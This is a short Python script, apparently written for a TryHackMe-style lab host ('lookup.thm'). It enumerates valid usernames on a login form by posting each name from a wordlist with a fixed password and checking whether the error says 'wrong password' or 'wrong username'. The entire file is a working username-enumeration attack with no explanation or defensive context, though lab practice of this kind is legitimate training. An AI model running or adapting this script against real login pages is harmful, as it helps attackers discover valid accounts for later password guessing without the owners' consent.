import requests
url = "http://lookup.thm/login.php"
# Define the file path containing usernames
file_path = "/usr/share/wordlists/test.txt"
try:
    with open(file_path, "r") as file:
        for line in file:
            uname = line.strip()
            if not uname:
                continue
            data = {"username":uname,"password":"12345"}
            response = requests.post(url, data=data)
            if "wrong password" in response.text:
                print(f"correct username: {uname}")
            elif "wrong username" in response.text:
                continue
except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")    
                

